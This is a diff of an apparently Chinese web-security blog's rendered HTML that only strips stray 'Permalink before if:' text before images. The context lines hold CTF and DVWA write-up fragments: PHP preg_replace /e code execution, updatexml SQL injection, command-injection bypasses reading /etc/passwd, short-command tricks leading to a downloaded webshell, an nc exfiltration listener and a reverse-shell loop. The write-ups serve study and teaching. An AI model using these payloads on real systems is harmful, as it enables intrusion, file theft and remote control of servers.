 &lt;p>进入页面发现比之前多了一个修改的功能，这里以为是可以修改其他人的然后返回修改结果&amp;hellip;谁知道修改自己的都有点小 bug &amp;hellip;&lt;/p>
 &lt;p>后来发现，是可以通过编辑功能在 &lt;code>placeholder&lt;/code>处看到其他人的信息&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004348.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004348.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004348.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="mongodb-injection">MongoDB injection
@@ -13597,7 +13535,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009689.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009689.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009689.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="authentication">Authentication
@@ -13921,7 +13859,7 @@ loading="lazy"
 &lt;h4 id="example-5-2">Example 5
 &lt;/h4>&lt;p>这里就是几个验证码，而且都是形成了单词，比如 hacker/securtiy 等，官方给的是弄一个字典爆破&lt;/p>
 &lt;h4 id="example-6-2">Example 6
-&lt;/h4>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004116.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004116.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004116.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里是可以直接识别得出来的，字体并没有经过任何变换。&lt;/p>
@@ -13942,7 +13880,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;h4 id="example-8-1">Example 8
-&lt;/h4>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009492.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009492.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009492.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里是 7 的进化，进行了一点扭曲&lt;/p>
@@ -13963,7 +13901,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;h4 id="example-9-1">Example 9
-&lt;/h4>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008020.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008020.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008020.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>简单计算，python 正则取出来直接&lt;code>eval&lt;/code>即可&lt;/p>
@@ -14542,7 +14480,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005160.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -15042,7 +14980,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003780.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -15075,7 +15013,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008506.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
@@ -15153,7 +15091,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008206.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
@@ -16536,7 +16474,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">``&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007581.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007581.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007581.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="表名不完全可控且desc的表名不含反引号select的表名含有反引号">表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号
@@ -16585,7 +16523,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">shop_user&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x5e24&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x5e24&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">#``&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007624.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007624.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007624.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="无列名注入">无列名注入
@@ -20692,7 +20630,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里没有对&lt;code>ip&lt;/code>进行输入检测，所以我们可以使用&lt;code>;cmd&lt;/code>的方式进行命令注入。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007771.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: medium&lt;/p>
@@ -20763,7 +20701,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仅仅只是增加了&lt;code>&amp;amp;&amp;amp;&lt;/code>与&lt;code>;&lt;/code>两个的过滤。然而我们仍然可以使用&lt;code>|&lt;/code>来进行绕过。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007771.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: high&lt;/p>
@@ -20848,7 +20786,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仔细观察，其实&lt;code>|&lt;/code>管道符这里有一个空格，所以我们&lt;code>medium&lt;/code>的&lt;code>payload&lt;/code>还可以继续使用，但是如果真的过滤了&lt;code>|&lt;/code>怎么办呢。我们其实还可以抓包加入&lt;code>%0a&lt;/code>换行符进行一个绕过。使用&lt;code>127.0.0.1 %0acat /etc/passwd&lt;/code>进行绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008189.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="command-injection-impossible">Command Injection: impossible
@@ -21073,14 +21011,14 @@ loading="lazy"
 &lt;li>
 &lt;p>在&lt;code>url&lt;/code>的编码绕过&lt;/p>
 &lt;p>这里我&lt;code>fuzz&lt;/code>了一下，&lt;code>Linux bash&lt;/code>可以使用&lt;code>%20(space)&lt;/code>、&lt;code>%09(tab)&lt;/code>、&lt;code>%3c(&amp;lt;)&lt;/code>以及&lt;code>+&lt;/code>来绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004461.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>花括号拓展&lt;code>{OS_COMMAND,ARGUMENT}&lt;/code>&lt;/p>
 &lt;p>在&lt;code>Linux bash&lt;/code>中还可以使用&lt;code>{cat,/etc/passwd}&lt;/code>来绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009158.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -21267,7 +21205,7 @@ loading="lazy"
 &lt;h3 id="举个例子-1">举个例子
 &lt;/h3>&lt;h4 id="短命令执行">短命令执行
 &lt;/h4>&lt;p>首先按照前面的&lt;code>&amp;gt;&lt;/code>的用法，我们可以知道有标准输出可以输出到文件，所以&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007866.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们有两种构造方式:&lt;/p>
@@ -21290,13 +21228,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008039.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;ol start="2">
 &lt;li>使用&lt;code>\\&lt;/code>，这种方法是利用&lt;code>\&lt;/code>来拼接字符串，其中前一个&lt;code>\&lt;/code>是用来转义后一个&lt;code>\&lt;/code>的。这里需要考虑时间顺序，需要逆序来创建文件。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004356.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-1七字绕过">Example 1 七字绕过
@@ -21446,7 +21384,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里需要我们注意的是&lt;code>cmd &amp;lt;= 5&lt;/code>，所以我们就不能在使用&lt;code>ls -t&amp;gt;a&lt;/code>。&lt;/p>
 &lt;p>但是我们还是可以通过比较巧妙的构造来实现&lt;code>ls -t&amp;gt;a&lt;/code>这么一个操作的。可以先通过把&lt;code>ls -t&amp;gt;a&lt;/code>这样拆分成几段写入到&lt;code>_&lt;/code>文件存放。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008919.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们就可以看到&lt;code>_&lt;/code>里面的内容，第一行无效命令，2-5行因为末尾有&lt;code>\&lt;/code>连接字符的存在所以可以连接字符串形成&lt;code>ls -t&amp;gt;g&lt;/code>，最后一行执行&lt;code>ls&lt;/code>。所以&lt;code>sh _&lt;/code>我们可以得到当前目录&lt;code>ls -t&amp;gt;g&lt;/code>的效果。达到与&lt;code>Example 1&lt;/code>一致的效果，其他步骤与&lt;code>Example 1&lt;/code>类似，就不再赘述了。下面给出&lt;code>Orange&lt;/code>的&lt;code>exp&lt;/code>&lt;/p>
@@ -21578,25 +21516,25 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这题相比之前又难了一点，这次是&lt;code>cmd &amp;lt;= 4&lt;/code>，但是原理还是一样的。我们要处理的问题还是&lt;code>ls -t&amp;gt;g&lt;/code>这么一个问题。然后因为长度限制，如果我们还用&lt;code>\\&lt;/code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用&lt;code>&amp;gt;&lt;/code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如&lt;code>Exmaple 2&lt;/code>中的&lt;code>&amp;gt;\ \\&lt;/code>这里就不能再使用了。但是我们这里再提一个&lt;code>trick&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007665.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005128.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>*&lt;/code> 相当于&lt;code>$(dir *)&lt;/code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009411.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用&lt;code>*&lt;/code>去执行的话，发现并不可以，因为按照&lt;code>dir&lt;/code>的文件排序，&lt;code>-t&lt;/code>也是排在最前面。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008096.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;/p>
 &lt;p>所以如果我们需要运用&lt;code>-&lt;/code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把&lt;code>-t&lt;/code>置于后面。&lt;/p>
 &lt;p>这里我们可以使用&lt;code>t-&lt;/code>这种逆序的模式把&lt;code>t&lt;/code>放到前面来，就可以比较正常的排序了。&lt;/p>
 &lt;p>逆序的命令我们可以用&lt;code>rev&lt;/code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用&lt;code>dir&lt;/code>来展示当前目录，同时&lt;code>d&lt;/code>字母也比较靠前，不要像&lt;code>ls&lt;/code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造&lt;code>ls -t&amp;gt;g&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008113.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能有几个让大家比较疑惑的地方，比如为什么是&lt;code>&amp;gt;ht-&lt;/code>，个人理解是因为&lt;code>ls&lt;/code>逆序是&lt;code>sl&lt;/code>，&lt;code>s&lt;/code>是排在&lt;code>t&lt;/code>前的，如果不加&lt;code>h&lt;/code>，&lt;code>t-&lt;/code>会在&lt;code>sl&lt;/code>之后，而且&lt;code>ls -th&lt;/code>与&lt;code>ls -t&lt;/code>效果是一样的，然后我们再找一个&lt;code>h&lt;/code>之前的字母做输出文件就可以了。还有一个地方就是&lt;code>*v&amp;gt;x&lt;/code>，之前我们讲过了通配符以及&lt;code>*&lt;/code>的作用，这里&lt;code>*v&lt;/code>就相当于&lt;code>$(dir *v)&amp;gt;x&lt;/code>，&lt;code>dir *v&lt;/code>返回的就是结尾为&lt;code>v&lt;/code>的文件，这里就是&lt;code>rev&lt;/code>与&lt;code>v&lt;/code>两个文件，如果只有相当于先把&lt;code>v&lt;/code>文件内容进行逆序，而后再输入到&lt;code>x&lt;/code>文件，这样整个&lt;code>ls -t&amp;gt;g&lt;/code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接&lt;code>wget&lt;/code>或者&lt;code>curl&lt;/code>一个&lt;code>webshell&lt;/code>到服务器上就好了，就不再赘述了。&lt;/p>
@@ -21719,7 +21657,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个用起来比较简单，直接去查看对应的记录就好了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005118.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。&lt;/p>
@@ -21746,10 +21684,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l -n -vv -p &lt;span class="m">53&lt;/span> -u -k&lt;span class="o">(&lt;/span>如果不支持-k也可以不用-k&lt;span class="o">)&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004044.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008182.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Same:&lt;/p>
@@ -21956,7 +21894,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cat &amp;lt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="nv">$line&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &amp;gt;&lt;span class="p">&amp;amp;&lt;/span>5&lt;span class="p">;&lt;/span> &lt;span class="k">done&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003384.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>nc&lt;/code>方式&lt;/p>
